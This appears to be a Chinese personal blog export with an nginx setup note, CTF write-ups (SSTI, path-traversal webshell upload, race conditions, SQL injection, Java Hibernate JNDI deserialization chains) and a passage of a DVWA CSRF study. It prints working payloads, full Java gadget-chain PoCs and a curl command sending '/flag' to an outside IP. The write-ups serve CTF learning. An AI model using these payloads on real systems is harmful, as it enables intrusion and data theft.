    <url>/2024/05/19/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E9%85%8D%E7%BD%AE%E9%87%8D%E5%AE%9A%E5%90%91%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[参考资料Nginx入门必须懂3大功能配置 - Web服务器&#x2F;反向代理&#x2F;负载均衡
云服务器配置重定向文件
Ubuntu 自建安装Apache+MySQL+PHP环境
安装MySQL和PHP环境按照上面的参考文章走
配置nginx首先先安装nginx：apt install nginx
查看版本：nginx -v
运行nginx：service nginx status
先让我们进入：cd /etc/nginx，然后 ls -lh可以看到目录下面有sites-enabled文件
sites-enabled：很明显这个目录可以写配置
sites-availabled：这个一般来说就不行了
https://www.jianshu.com/p/42c4ffd044e6
看不懂，先这样理解。
配置代码可以利用WinSCP软件来帮助我们创建并修改文件
在enabled下创建port_sherlock(这只是一个名称.jpg)，代码如下：
server&#123;	listen port;	server_name IP;	root /var/www/html;	index sherlock.php;		location / &#123;		try_files $uri $uri/ =404;	&#125;	location ~ \.php$ &#123;		include snippets/fastcgi-php.conf;       fastcgi_pass unix:/var/run/php/php8.3-fpm.sock;  			# 确保这里的版本号与安装的PHP版本匹配	&#125;	location ~ /\.ht &#123;        deny all;    &#125;&#125;

server 块server &#123;

这个块定义了一个虚拟服务器的配置，所有的配置指令都在这个块内。
listen 指令listen 614;

listen 指令指定Nginx监听的端口号。在这个例子中，Nginx将监听614端口。
server_name 指令server_name IP;

server_name 指令指定了这个虚拟服务器的服务器名称或IP地址。在这个例子中，服务器名称是 120.26.138.45。
root 指令root /var/www/html;

root 指令设置了服务器根目录。在这个例子中，根目录是 /var/www/html，即所有的请求文件都相对于这个目录。
index 指令index redirect.php;

index 指令指定了默认的索引文件。在这个例子中，当访问根目录时，默认文件是 redirect.php。
location &#x2F; 块location / &#123;    try_files $uri $uri/ =404;&#125;

location / 块定义了对根路径的请求处理方式。try_files 指令尝试按顺序查找文件：

$uri：请求的URI。
$uri/：请求的URI作为目录。
=404：如果前两个都找不到，返回404错误。

location ~ .php$ 块location ~ \.php$ &#123;    include snippets/fastcgi-php.conf;    fastcgi_pass unix:/var/run/php/php8.3.6-fpm.sock;  # 确保这里的版本号与安装的PHP版本匹配&#125;

location ~ \.php$ 块定义了对PHP文件的请求处理方式：

include snippets/fastcgi-php.conf：包含了FastCGI的配置片段。
fastcgi_pass unix:/var/run/php/php8.3.6-fpm.sock：将PHP请求传递给PHP-FPM服务，通过Unix套接字通信。这里的版本号需要与实际安装的PHP版本匹配。

location ~ &#x2F;.ht 块location ~ /\.ht &#123;    deny all;&#125;

location ~ /\.ht 块定义了对以 .ht 开头的文件的请求处理方式：

deny all：拒绝所有访问。这通常用于保护 .htaccess 文件，不让它们被外部访问。

善后检查配置是否错误：
nginx -t

重载：
systemctl reload nginx

]]></content>
      <categories>
        <category>服务器</category>
      </categories>
  </entry>
  <entry>
    <title>校赛题解</title>
    <url>/2024/04/06/%E6%A0%A1%E8%B5%9B%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[Misc先来签个到吧点击链接，百度网盘提取，看视频
看到要到一半的时候会突然闪过一个二维码，于是就是见手速的时候了，在这几秒疯狂疯狂暂停，最终暂停到了二维码处，扫码得到flag
爬山给了一张图片
打开kali，在终端输入命令：exiftool 图片名，得到图片的具体信息，最后几行是拍摄的经纬度：24 deg 30&#39; 17.30&quot; N；118 deg 3&#39; 20.03&quot; E，拿给gpt稍修一下得到：24°30&#39;17&quot;N 118°3&#39;20&quot;E，把该坐标拿到谷歌地球中搜索一下，发现位于厦门市海沧区的一个公园附近，已知小涂是小学生，上的是小学，开始社工，启动高德地图，搜索海沧区小学，把搜索到的小学名一个个输进去，最后得到是天堂山小学
webezzzzzzzzz_PTA进入环境发现要让我们写python代码，盲猜ssti漏洞
开始测试，首先输入 print([].__class__.__base__.__subclasses__())得到所有的子类，然后发现我要使用的&lt;class &#39;subprocess.Popen&#39;&gt;位于最后一个507，于是我们输入payload：[].__class__.__base__.__subclasses__()[507](&#39;ls /&#39;,shell=True,stdout=-1).communicate()[0].strip()
发现flag位于根目录处，继续 [].__class__.__base__.__subclasses__()[507](&#39;cat /flag&#39;,shell=True,stdout=-1).communicate()[0].strip()得到flag
Potato_Netdisk下载附件，得到源码，最开始是查看fileUpload.php，在文件上传那边使劲尝试目录穿越，也将..进行编码后进行上传，但无论怎样操作还是不行，想着文件会先存在临时目录中 /tmp/upload下面，tmp目录位于根目录处，当时想着临时存储和删掉文件之间会有一定的时间，想着条件竞争进行文件上传，但最终还是失败了
之后查看dirUpload.php文件，发现了以下代码：
function validateFilePath($path): void&#123;    if(str_contains($path,&#x27;..&#x27;.DIRECTORY_SEPARATOR) || str_contains($path,&#x27;/var/www/html&#x27;))&#123;        http_response_code(403);        die(&quot;非法上传路径！&quot;.&#x27;&lt;br&gt;&#x27;.$path);    &#125;&#125;function normalizeFilePath($path): string&#123;    if(strpos($_SERVER[&#x27;HTTP_USER_AGENT&#x27;], &#x27;Windows&#x27;))&#123;        return str_replace(&#x27;\\&#x27;,&#x27;/&#x27;,$path);    &#125;    return $path;&#125;

以及
if($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27;)&#123;    foreach ($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;] as $key =&gt; $tmp_name)&#123;        $dest = UPLOAD_DIR.$_FILES[&#x27;file&#x27;][&#x27;full_path&#x27;][$key];        validateFilePath($dest);        uploadFile($tmp_name, normalizeFilePath($dest));    &#125;&#125;

上传的文件夹是先检测是否有非法路径然后再把 \改成 /，检测的函数用的是str_contains，所以我们可以有这样的绕过，用bp抓包，把上传的文件名改为..\..\..\..\var\www\html\shel.php，上传成功，文件内容为&lt;?php system(&#39;ls /&#39;);?&gt;
由于我们访问http://121.43.34.239:20017/index.php，就相当于访问/var/www/html/index.php，所以我们要访问上传的文件就是要访问http://121.43.34.239:20017/shell.php，得到根目录下的文件，接着把文件内容改为&lt;?php system(&#39;cat /flag&#39;);?&gt;，得到我们所需要的flag
Potato_Netdisk_v2.0有了上题的经验，这题我们直接看dirUpload.php，发现了与第一题不一样的地方，如下：
function validateFilePath($path): void&#123;    if(str_contains($path,&#x27;..&#x27;.DIRECTORY_SEPARATOR) || preg_match(&#x27;/var.www.html/&#x27;,$path))&#123;        http_response_code(403);        die(&quot;非法上传路径！&quot;.&#x27;&lt;br&gt;&#x27;.$path);    &#125;&#125;

发现了preg_match(&#39;/var.www.html/&#39;,$path)，正则表达式中的.表示匹配任意字符，所以按照上一题的思路绕过的话是行不通的，然后想到了可以通过通配符来进行绕过，页面是会显示文件成功上传，但是会显示报错，所以这种思路也是不行的，后面进行条件竞争的时候会失败，继续思考想到了可以通过\var\www\.\html来进行绕过，文件成功上传，并且没有报错
再看到如下的代码：
//清除网页目录下的其他文件function cleanup($dir): void&#123;    global $file_whitelist;    $files = scandir($dir);    $files = array_diff($files,$file_whitelist);    foreach ($files as $file)&#123;        $path = $dir.&#x27;/&#x27;.$file;        @unlink($path);    &#125;&#125;if($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27;)&#123;    foreach ($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;] as $key =&gt; $tmp_name)&#123;        $dest = UPLOAD_DIR.$_FILES[&#x27;file&#x27;][&#x27;full_path&#x27;][$key];        validateFilePath($dest);        uploadFile($tmp_name, normalizeFilePath($dest));    &#125;    cleanup(__DIR__);&#125;

发现在文件成功上传之后，会清除掉除了白名单外的其他所有文件，白名单如下：
file_whitelist = array(    &#x27;.&#x27;,    &#x27;..&#x27;,    &#x27;index.php&#x27;,    &#x27;config.php&#x27;,    &#x27;dirUpload.php&#x27;,    &#x27;fileUpload.php&#x27;);

可以发现，在文件成功上传和删除之间存在时间差，可以利用条件竞争，分别用bp抓/dirUpload.php（上传文件）以及 /shell.php（用来访问所上传的文件）
上传文件的条目先发送到重放器中，修改filename为..\..\..\..\var\www\.\html\shell.php，上传文件的内容为&lt;?php system(&#39;cat /flag&#39;);?&gt;，接着把两个都放到intruder模块下来，选择无payload，两边一起开始攻击，然后查看访问文件的那个，发现状态码为200，成功访问，得到flag
can_u_find_meblacklist = [&#x27;_&#x27;, &#x27;[&#x27;, &#x27;globals&#x27;, &#x27;url_for&#x27;, &#x27;count&#x27;, &#x27;length&#x27;, &#x27;init&#x27;, &#x27;request&#x27;, &#x27;builtins&#x27;, &#x27;select&#x27;, &#x27;dict&#x27;, &#x27;(&#x27;,&#x27;join&#x27;, &#x27;import&#x27;, &#x27;os&#x27;, &#x27;&#123;&#x27;, &#x27;open&#x27;, &#x27;eval&#x27;, &#x27;set&#x27;, &#x27;%&#x27;, &#x27;for&#x27;, &#x27;class&#x27;, &#x27;\&#x27;&#x27;, &#x27;\&quot;&#x27;, &#x27;chr&#x27;, &#x27;attr&#x27;, &#x27;|&#x27;]def waf(s):    for i in blacklist:        if i in s.split(&#x27;/&#x27;)[-1]:            return s + &#x27;?hacker&#x27;    return render_template_string(s)@app.errorhandler(404)def page_not_found(e):    url = waf(request.url)    return render_template(&#x27;404.html&#x27;, error_page=url), 404

上面黑名单中把所有有可能的ssti操作全部过滤掉了，但是我们可以看到函数waf的定义，它只检测url中的最后一个/后面的内容，所以我们可以向url中多输入几个，比如：/&#123;&#123;7*7&#125;&#125;/a，可以发现成功执行ssti的相关代码，然后我们就可以直接进行无任何waf的ssti操作了，但是要注意这里的话不能直接输入空格，可以用$&#123;IFS&#125;来进行代替
输入/&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;/a，得到所有的子类，找到我们需要的（当然也可以用脚本来执行）
接着/&#123;&#123;[].__class__.__base__.__subclasses__()[519]('ls$&#123;IFS&#125;/',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;/a爆出根目录下的所有文件
/&#123;&#123;[].__class__.__base__.__subclasses__()[519]('cat$&#123;IFS&#125;/flag',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;/a得到flag
最后成功得到flag
EatPotato!首先利用题目给我们提供的网站（https://xcheck.tencent.com/index）来分析一下哪里有漏洞

于是我们到源码文件夹中去找寻这行代码，如下：
$score_sql = &quot;SELECT `score`,`time`,`attempts` FROM &quot; . $ranking . &quot; where name=&#x27;&quot; . $_SESSION[&#x27;name&#x27;] . &quot;&#x27;&quot;;            $score_result = $link-&gt;query($score_sql);

这⾥有两处拼接， $ranking 变量和 $_SESSION[&#39;name&#39;] 变量，利⽤phpstorm的跟进快捷键 (Ctrl+b)，我们可以看到ranking变量实际上是定值，再查看name变量，得到以下结果：
if (isset($_GET[&#x27;name&#x27;])) &#123;  $_SESSION[&#x27;name&#x27;] = $_GET[&#x27;name&#x27;];&#125;

先注册一个账号，然后打个游戏，后面去查看排行榜，发现url为http://localhost:20010/rank.php?name=sherlock，开始尝试注入，单引号包裹，报错注入，得到flag
被你们玩坏了的ping这一题没有回显数据，所以我们可以采用外带数据的方法或者将文件内容写入静态目录进行查看的办法
第一种为外带
首先监听端口：nc -lvnp 7890
然后在题目提供的框框中输入：
curl http://124.70.99.199:7890/?a=`cat /flag | base64`

然后查看监听的内容
第二种方法就是写入静态目录
cat /flag &gt; static/res.txt，然后直接访问/static/res.txt即可得到flag
PTA-max]]></content>
      <categories>
        <category>Write-Up</category>
      </categories>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/05/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>软件系统安全赛2025华东赛区半决赛web-justDeserialize</title>
    <url>/2025/03/30/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B2025%E5%8D%8E%E4%B8%9C%E8%B5%9B%E5%8C%BA%E5%8D%8A%E5%86%B3%E8%B5%9Bweb-justDeserialize/</url>
    <content><![CDATA[前言看着这题目jar包有接近40Mb的时候就直接决定先去学下tabby的简单使用，由于学业影响和自己配置过程中遭遇了许多莫名其妙的报错导致花了三天才结束
开始做题，解题过程中发现其实不需要tabby，心有点痛（虽说这工具早晚都要学。。。）
题解先自己本地根据jar包搭了个环境以便进行调试
大概过了一下比较重要的文件，首先就是backdoor.class文件，里面重要的点是给了我们一个&#x2F;read路由
@RequestMapping(&#123;&quot;/read&quot;&#125;)    public String read(@RequestBody String body) &#123;        if (body != null) &#123;            try &#123;                byte[] data = Base64.getDecoder().decode(body);                String temp = new String(data);                if (!temp.contains(&quot;naming&quot;) &amp;&amp; !temp.contains(&quot;com.sun&quot;) &amp;&amp; !temp.contains(&quot;jdk.jfr&quot;)) &#123;                    ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(data);                    MyObjectInputStream objectInputStream = new MyObjectInputStream(byteArrayInputStream);                    Object object = objectInputStream.readObject();                    return object.getClass().toString();                &#125; else &#123;                    return &quot;banned&quot;;                &#125;            &#125; catch (Exception var7) &#123;                Exception e = var7;                return e.toString();            &#125;        &#125; else &#123;            return &quot;ok&quot;;        &#125;    &#125;

会检测解码后的序列化内容中是否存在naming，com.sun，jdk.jfr字段，有的话直接返回banned
如果成功进入if内容，会调用自己写的MyObjectInputStream来进行反序列化操作，通过查看MyObjectInputStream类可以明白只要是加了一个黑名单检测
黑名单内容如下：
javax.management.BadAttributeValueExpExceptioncom.sun.org.apache.xpath.internal.objects.XStringjava.rmi.MarshalledObjectjava.rmi.activation.ActivationIDjavax.swing.event.EventListenerListjava.rmi.server.RemoteObjectjavax.swing.AbstractActionjavax.swing.text.DefaultFormatterjava.beans.EventHandlerjava.net.Inet4Addressjava.net.Inet6Addressjava.net.InetAddressjava.net.InetSocketAddressjava.net.Socketjava.net.URLjava.net.URLStreamHandlercom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpljava.rmi.registry.Registryjava.rmi.RemoteObjectInvocationHandlerjava.rmi.server.ObjIDjava.lang.Systemjavax.management.remote.JMXServiceURjavax.management.remote.rmi.RMIConnectorjava.rmi.server.RemoteObjectjava.rmi.server.RemoteRefjavax.swing.UIDefaults$TextAndMnemonicHashMapjava.rmi.server.UnicastRemoteObjectjava.util.Base64java.util.Comparatorjava.util.HashMapjava.util.logging.FileHandlerjava.security.SignedObjectjavax.swing.UIDefaults

可以看到主要是禁了一些基础链子，甚至是HashMap类都给你禁掉了
最开始看到题目依赖里面有jackson依赖，并且版本正确可以用通杀的时候想直接上手，但是黑名单直接把必需的两个类给禁掉了
另寻思路，发现还有hibernate依赖，更幸运的是该链子除了一个入口类HashMap给禁掉了之外剩下的都没有
很好，正好看这道题之前刚学完Rome反序列化，知道与HashMap类起到的作用类似的还有一个HashTable类
自己测试一手看看是否有hibernate漏洞
自己写的Users类
package org.sherlock;import java.io.Serializable;public class Users implements Serializable &#123;    private static final long serialVersionUID = -7576821597219903730L;    public int id;    public void setId(int id)&#123;        this.id = id;    &#125;    public int getId() throws Exception&#123;        Runtime.getRuntime().exec(&quot;calc&quot;);        return id;    &#125;&#125;

测试的poc
package org.sherlock;import org.hibernate.engine.spi.TypedValue;import org.hibernate.property.access.spi.Getter;import org.hibernate.property.access.spi.GetterMethodImpl;import org.hibernate.tuple.component.AbstractComponentTuplizer;import org.hibernate.tuple.component.PojoComponentTuplizer;import org.hibernate.type.ComponentType;import sun.reflect.ReflectionFactory;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.util.Base64;import java.util.Hashtable;public class Main &#123;    public static void main(String[] args) throws Exception&#123;        Users user = new Users();        user.setId(1);        Hashtable&lt;Object, Object&gt; hashtable = new Hashtable&lt;&gt;();        ComponentType componentType = (ComponentType) createObjWithoutConstructor(ComponentType.class);        setField(componentType,&quot;propertySpan&quot;,2);        TypedValue typedValue = new TypedValue(componentType,user);        PojoComponentTuplizer pojoComponentTuplizer = (PojoComponentTuplizer) createObjWithoutConstructor(PojoComponentTuplizer.class);        Class&lt;?&gt; c = AbstractComponentTuplizer.class;        Field field = c.getDeclaredField(&quot;getters&quot;);        field.setAccessible(true);        field.set(pojoComponentTuplizer,new Getter[]&#123;new GetterMethodImpl(Object.class,&quot;qwq&quot;, Users.class.getDeclaredMethod(&quot;getId&quot;))&#125;);        setField(componentType,&quot;componentTuplizer&quot;,pojoComponentTuplizer);        hashtable.put(1,1);        Field tableField = Hashtable.class.getDeclaredField(&quot;table&quot;);        tableField.setAccessible(true);        Object[] table = (Object[]) tableField.get(hashtable);        for (Object entry: table)&#123;            if (entry != null)&#123;                setField(entry,&quot;key&quot;,typedValue);            &#125;        &#125;        byte[] bytes = ser(hashtable);        System.out.println(Base64.getEncoder().encodeToString(bytes));        unser(bytes);    &#125;    public static Object createObjWithoutConstructor(Class clazz) throws Exception&#123;        ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory();        Constructor&lt;Object&gt; constructor = Object.class.getDeclaredConstructor();        Constructor&lt;?&gt; constructor1 = reflectionFactory.newConstructorForSerialization(clazz,constructor);        constructor1.setAccessible(true);        return constructor1.newInstance();    &#125;    public static void setField(Object object,String fieldName,Object value) throws Exception&#123;        Class&lt;?&gt; c = object.getClass();        Field field = c.getDeclaredField(fieldName);        field.setAccessible(true);        field.set(object,value);    &#125;    public static byte[] ser(Object o) throws Exception&#123;        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);        objectOutputStream.writeObject(o);        return byteArrayOutputStream.toByteArray();    &#125;    public static Object unser(byte[] bytes) throws Exception&#123;        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);        return objectInputStream.readObject();    &#125;&#125;

测试可以正常弹出计算器，存在hibernate漏洞
ok，我们继续，因为上面测试的Users类是我们自己写出来的，所以我们要找到题目本身可以利用的getter方法
掏出苦练三天的tabby，开始扫
由于这个过程实在是有点久（轻薄本开尽马力扫了差不多45分钟。。。），在这过程中boring的我又去翻了翻自己学hibernate漏洞的笔记，发现hibernate2这条链子利用的是jndi注入，并且用到的关键类com.sun.rowset.JdbcRowSetImpl不在黑名单上面
芜湖，但有点可惜的是还是过不了if判断
看看tabby扫出来的有什么可以利用的

丫的，用到的LdapAttribute类也是在com.sun包下面的，也过不了if判断
很好，这说明其实没区别了，都要想办法绕过if判断，这也就是说能绕过那我直接用hibernate2的链就好了，不需要再花脑子去想tabby扫出来的这个要怎么利用
那要怎么绕呢，我就去工具java-chains里面逛了逛（强推java-chains工具，好用！！！），发现里面有提供对生成的payload进行一个混淆的功能

脏数据，主要还是针对waf的性能进行的一个绕过，在我们这里没有用
那Utf8OverlongEncoding是什么东东，有什么用：https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html
看完p神文章恍然大悟，可以利用Utf8OverlongEncoding方法进行绕过
贴上poc（该poc在java8里面运行，因为sun.reflect在java11中没有）
package org.sherlock;import com.sun.rowset.JdbcRowSetImpl;import org.hibernate.engine.spi.TypedValue;import org.hibernate.property.access.spi.Getter;import org.hibernate.property.access.spi.GetterMethodImpl;import org.hibernate.tuple.component.AbstractComponentTuplizer;import org.hibernate.tuple.component.PojoComponentTuplizer;import org.hibernate.type.ComponentType;import sun.reflect.ReflectionFactory;import javax.sql.rowset.BaseRowSet;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.util.Base64;import java.util.Hashtable;public class Test &#123;    public static void main(String[] args) throws Exception&#123;        Hashtable&lt;Object,Object&gt; hashtable = new Hashtable&lt;&gt;();        ComponentType componentType = (ComponentType) createObjWithoutConstructor(ComponentType.class);        setField(componentType,&quot;propertySpan&quot;,2);        PojoComponentTuplizer pojoComponentTuplizer = (PojoComponentTuplizer) createObjWithoutConstructor(PojoComponentTuplizer.class);        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();        Class c0 = BaseRowSet.class;        Field dataSourceField = c0.getDeclaredField(&quot;dataSource&quot;);        dataSourceField.setAccessible(true);        dataSourceField.set(jdbcRowSet,&quot;ldap://127.0.0.1:50389/98b84c&quot;);        Class&lt;?&gt; c = AbstractComponentTuplizer.class;        Field field = c.getDeclaredField(&quot;getters&quot;);        field.setAccessible(true);        field.set(pojoComponentTuplizer,new Getter[]&#123;new GetterMethodImpl(Object.class,&quot;qwq&quot;, JdbcRowSetImpl.class.getDeclaredMethod(&quot;getDatabaseMetaData&quot;))&#125;);        setField(componentType,&quot;componentTuplizer&quot;,pojoComponentTuplizer);        hashtable.put(1,1);        TypedValue typedValue = new TypedValue(componentType,jdbcRowSet);        Field tableField = Hashtable.class.getDeclaredField(&quot;table&quot;);        tableField.setAccessible(true);        Object[] table = (Object[]) tableField.get(hashtable);        for (Object entry: table)&#123;            if (entry != null)&#123;                setField(entry,&quot;key&quot;,typedValue);            &#125;        &#125;        byte[] bytes = ser(hashtable);        System.out.println(Base64.getEncoder().encodeToString(bytes));        unser(bytes);    &#125;    public static Object createObjWithoutConstructor(Class clazz) throws Exception&#123;        ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory();        Constructor&lt;Object&gt; constructor = Object.class.getDeclaredConstructor();        Constructor&lt;?&gt; constructor1 = reflectionFactory.newConstructorForSerialization(clazz,constructor);        constructor1.setAccessible(true);        return constructor1.newInstance();    &#125;    public static void setField(Object object,String fieldName,Object value) throws Exception&#123;        Class&lt;?&gt; c = object.getClass();        Field field = c.getDeclaredField(fieldName);        field.setAccessible(true);        field.set(object,value);    &#125;    public static byte[] ser(Object o) throws Exception&#123;        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);        objectOutputStream.writeObject(o);        return byteArrayOutputStream.toByteArray();    &#125;    public static Object unser(byte[] bytes) throws Exception&#123;        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);        return objectInputStream.readObject();    &#125;&#125;

将生成的base64编码字符串拿到java-chains工具中进行一个Utf8OverlongEncoding混淆后，再拿到bp中post传过去
正常反序列化攻击报错，但是没弹出计算器
why,why,why
自己调试了一下，发现忘记了题目版本是java11，已经不允许远程类加载了
无妨，之前学过jndi高版本绕过，用上，结果报错如下：

不安全字段forceString字段已经没掉了(高版本绕过没学的到家。。。。。。)
ok，脑子没思路了，求助了一下学长，告诉我java-chains里面还有可以绕过的链子
由于题目依赖里有jackson，利用上

将生成的ldap网址替代上面的poc中的ldap网址，将生成的base64字符串进行混淆，发送，成功弹出计算器

完结，撒花
引用软件系统安全赛2025华东赛区半决赛wp-web
]]></content>
      <categories>
        <category>Write-Up</category>
      </categories>
  </entry>
  <entry>
    <title>CSRF漏洞学习</title>
    <url>/2024/04/23/CSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0_max/CSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[参考及引用的文章浅谈csrf漏洞：https://xz.aliyun.com/t/7450?time__1311=n4%2BxnD0G0%3Dit0QDkID%2FiWRSD0xcDRlGerDWwD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-3
CSRF漏洞的原理CSRF漏洞产生的原因(1)http协议使用session在服务端保存用户的个人信息,客户端浏览器用cookie标识用户身份;
(2)cookie的认证只能确保是某个用户发送的请求,但是不能保证这个请求是否是”用户自愿的行为”.
(3)这时,用户登录了某个web站点,同时点击了包含CSRF恶意代码的URL,就会触发CSRF
漏洞利用的条件(1)用户必须登录A网站,生成了cookie
(2)登录的同时访问了恶意URL(包含CSRF恶意代码的URL)
换种解释就是网站的cookie在浏览器中不会过期，只要不关闭浏览器或者退出登录，那以后只要是访问这个网站，都会默认你已经登录的状态。而在这个期间，攻击者发送了构造好的csrf脚本或包含csrf脚本的链接，可能会执行一些用户不想做的功能（比如是添加账号等）
CSRF和XSS的不同(1)XSS主要是获取用户的cookie信息,达到控制客户端的目的
XSS—-&gt;把你的腰牌(用户身份象征也就是cookie)偷到手,黑客自己去搞破坏.
CSRF主要是劫持用户身份,让客户端做一些不愿意做的事.
CSRF—-&gt;拿刀劫持你,”借助你的身份”来帮黑客做事.
(2)危害上来说,XSS更大;
(3)从应用难度上来说
CSRF需要满足登录某网站的状态,同时访问了恶意的URL,应用条件比较苛刻.
XSS只要一次点击或者存储到服务器即可.
CSRF漏洞检测检测CSRF漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞
随着对CSRF漏洞研究的不断深入，不断涌现出一些专[门针对CSRF漏洞进行检测的工具,如CSRFTester, CSRF Request Builder等。
以CSRFTester工具为例，CSRF漏洞检测工具的测试原理如下：使用CSRFTester进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在CSRFTester中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击
DVWA-CSRFLow级别&lt;?phpif( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123;    // Get input    $pass_new  = $_GET[ &#x27;password_new&#x27; ];    $pass_conf = $_GET[ &#x27;password_conf&#x27; ];    // Do the passwords match?    if( $pass_new == $pass_conf ) &#123;        // They do!        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));        $pass_new = md5( $pass_new );        // Update the database        $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;;        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );//这行代码执行了SQL查询，更新数据库中的用户密码。如果执行失败，将会输出错误信息        // Feedback for the user        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;    &#125;    else &#123;        // Issue with passwords matching        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;    &#125;    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);//关闭MySQL连接，并返回关闭操作的结果。如果关闭操作成功，返回true；如果关闭操作失败，返回false。&#125;?&gt;


isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])：这部分代码首先检查$GLOBALS[&quot;___mysqli_ston&quot;]是否已经设置且为一个有效的MySQL连接对象。如果是，则表示数据库连接已经建立，可以执行转义操作；如果不是，则表示数据库连接尚未建立，无法执行转义操作。
mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new )：如果数据库连接已经建立，将调用mysqli_real_escape_string函数对新密码进行转义处理。这个函数会对字符串中的特殊字符进行转义，以防止它们被误解为SQL语句的一部分，从而防止SQL注入攻击。
(trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)：如果数据库连接未建立，或者转义操作失败，将会触发一个错误，并输出错误消息。这段代码似乎是为了提醒开发者修复MySQL转义函数调用的问题，因为它使用了已经弃用的mysql_escape_string函数，而不是推荐的mysqli_real_escape_string函数

该网站通过mysqli_real_escape_string()函数的过滤作用，将用户传入的数据中的特殊字符进行转义，对SQL注入做了防御。但没有对CSRF做任何防范措施
正常输入密码，然后抓包

用burpsuite自带的CSRF PoC进行攻击，将其生成的把CSRF HTML复制到本地，然后用该浏览器访问

点击提交请求后自动跳转到我们的页面，并且此时密码已被成功修改

以上过程中要注意的是一定不要中途更换浏览器，访问csrf.php的时要同一个浏览器访问，并且还要保证你登录DVWA的cookie没有过期，不然会因为缺少身份验证信息而执行失败
Medium级别&lt;?phpif( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123;    // Checks to see where the request came from    if( stripos( $_SERVER[ &#x27;HTTP_REFERER&#x27; ] ,$_SERVER[ &#x27;SERVER_NAME&#x27; ])!=-1 ) &#123;        // Get input        $pass_new  = $_GET[ &#x27;password_new&#x27; ];        $pass_conf = $_GET[ &#x27;password_conf&#x27; ];        // Do the passwords match?        if( $pass_new == $pass_conf ) &#123;            // They do!            $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));            $pass_new = md5( $pass_new );            // Update the database            $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;;            